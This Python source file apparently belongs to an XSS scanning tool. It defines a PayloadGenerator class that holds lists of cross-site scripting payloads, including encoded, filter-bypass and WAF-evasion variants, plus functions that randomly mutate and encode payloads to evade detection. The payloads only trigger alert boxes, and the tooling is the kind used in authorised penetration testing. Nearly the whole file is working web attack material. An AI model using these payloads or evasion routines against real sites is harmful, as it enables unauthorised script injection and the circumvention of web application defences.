#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import random
from typing import List, Dict, Any

from src.utils.exceptions import PayloadError

class PayloadGenerator:
    """XSS payload generator with different evasion techniques."""
    
    def __init__(self):
        self.basic_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')"
        ]
        
        self.advanced_payloads = [
            # Payloads with encoding
            "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
            "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
            
            # Payloads with filter bypass
            "<scr\x00ipt>alert('XSS')</scr\x00ipt>",
            "<scr\x20ipt>alert('XSS')</scr\x20ipt>",
            
            # Payloads based on events
            "<img src=x oneonerrorrror=alert('XSS')>",
            "<body onload=alert('XSS')>",
            
            # Payloads with Unicode
            "＜script＞alert('XSS')＜/script＞",
            
            # Payloads with mutation
            "<svg><script>alert('XSS')</script></svg>",
            "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
            
            # Payloads with data URI
            "<image src='data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7' onload=alert('XSS')>",
            
            # Payloads with regular expressions
            "<script>eval('\\x61lert\\x28\\x27XSS\\x27\\x29')</script>"
        ]
        
        self.waf_bypass_payloads = [
            # Basic WAF bypass
            "<Img Src=x OnError=alert('XSS')>",
            "<Script>alert('XSS')</Script>",
            
            # Bypass with comments
            "<!--><script>alert('XSS')</script-->",
            
            # Bypass with encoding
            "<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;\">XSS</a>",
            
            # Bypass with protocol mutation
            "<a href=\"javascript&colon;alert('XSS')\">XSS</a>",
            
            # Bypass with expressions
            "<script>window['alert']('XSS')</script>",
            "<script>(alert)('XSS')</script>",
            
            # Bypass with template literals
            "<script>`${alert('XSS')}`</script>",
            
            # Bypass with properties
            "<script>window['a'+'lert']('XSS')</script>",
            
            # Bypass with events
            "<div onpointerover=\"window.location='javascript:alert(1)'\">XSS</div>",
            
            # Bypass with CSS
            "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationend=\"alert('XSS')\"></xss>",
            
            # Bypass with SVG
            "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s><text x='20' y='20'>XSS</text><animate>",
            
            # Bypass with meta refresh
            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS');\">",
        ]
        
    def get_payloads(self, level: str = "all") -> List[str]:
        """Returns a list of payloads based on the specified level."""
        payloads = []
        
        if level in ["basic", "all"]:
            payloads.extend(self.basic_payloads)
            
        if level in ["advanced", "all"]:
            payloads.extend(self.advanced_payloads)
            
        if level in ["waf", "all"]:
            payloads.extend(self.waf_bypass_payloads)
            
        return payloads
        
    def get_random_payload(self, level: str = "all") -> str:
        """Returns a random payload of the specified level."""
        payloads = self.get_payloads(level)
        return random.choice(payloads)
        
    def generate_custom_payload(self, template: str, **kwargs) -> str:
        """Generates a custom payload based on a template."""
        return template.format(**kwargs)
        
    def mutate_payload(self, payload: str) -> str:
        """Mutates an XSS payload to create a variant."""
        mutations = [
            lambda p: p.replace("<script>", "<ScRiPt>"),
            lambda p: p.replace("alert", "\\x61lert"),
            lambda p: p.replace("'", '"'),
            lambda p: p.replace("script", "scr\\x69pt"),
            lambda p: f"<svg>{p}</svg>"
        ]
        
        # Applies a random mutation
        mutation = random.choice(mutations)
        return mutation(payload)
        
    def encode_payload(self, payload: str, encoding: str = "html") -> str:
        """Encodes a payload using different methods."""
        if encoding == "html":
            return "".join(f"&#{ord(c)};" for c in payload)
        elif encoding == "hex":
            return "".join(f"\\x{ord(c):02x}" for c in payload)
        elif encoding == "unicode":
            return "".join(f"\\u{ord(c):04x}" for c in payload)
        else:
            return payload 